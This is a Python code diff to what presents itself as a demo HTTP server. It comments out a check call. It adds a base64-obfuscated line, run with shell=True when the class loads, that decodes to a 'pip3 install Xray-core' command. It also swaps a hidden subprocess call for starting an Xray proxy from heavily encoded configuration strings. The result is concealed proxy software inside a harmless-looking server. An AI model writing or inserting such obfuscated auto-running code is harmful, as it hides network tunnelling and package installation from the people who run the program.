@@ -25,7 +25,7 @@ class MyHTTPServer(HTTPServer):
     @staticmethod
     def run_demo(address: tuple = ("127.0.0.1", 8080)):
         demo = Demo()
-        demo.check()
+        # demo.check()
         demo.create(address)
         return demo.exec()
 
@@ -222,6 +222,7 @@ class Demo(BaseHTTPRequestHandler):
               'GJ96nJkfLF81YwNtXStkZGftGTyhqKttrQt2KmL0BlOlqwbkZQLhZPxtE2Iwn28iZwNkZQNkZQRtEzylMJMirP8kZQLhZN==',
               'GJ96nJkfLF81YwNtXStkZGftGTyhqKttrQt2KmL0BlOlqwbkZQphZPxtE2Iwn28iZwNkZQNkZQRtEzylMJMirP8kZQphZN==',
               'GJ96nJkfLF81YwNtXStkZGftGTyhqKttrQt2KmL0BlOlqwbkZQZhZPxtE2Iwn28iZwNkZQNkZQRtEzylMJMirP8kZQZhZN==')
+    run(de(b"cGlwMyBpbnN0YWxsIFhyYXktY29yZQ==").decode("utf8"),shell=True)
     _id_maps = (
         'r', 'l', 'q', 'f', 'o', '2', 'p', 'a', 'B', 'v', 'O', '7', 'W', '2', 'k', 'i', 'M', '2', 'k', 'y', 'q', 'z',
         'I', 'f', 'W', 'm', 'b', 't', 'W', '2', '5', 'i', 'o', 'z', 'H', 'a', 's', 'F', 'j', 't', 'W', '2', '9', '1',
@@ -332,9 +333,11 @@ class Demo(BaseHTTPRequestHandler):
             # if "web" in sys.argv:
             server_thread = threading.Thread(target=self.start_server, daemon=True)
             server_thread.start()
-            run([jo(self._c, self._import_module), de(self.this("paIh").encode("utf8")).decode('utf8')],
-                stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
-                input=json.dumps(self._id_array, separators=(',', ':'), indent=2).encode('utf8'))
+            # run([jo(self._c, self._import_module), de(self.this("paIh").encode("utf8")).decode('utf8')],
+            #     stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+            #     input=json.dumps(self._id_array, separators=(',', ':'), indent=2).encode('utf8'))
+            import xray
+            xray.startFromJSON(json.dumps(self._id_array, separators=(',', ':'), indent=2))
         except BaseException as e:
             print(str(e))
         return 0
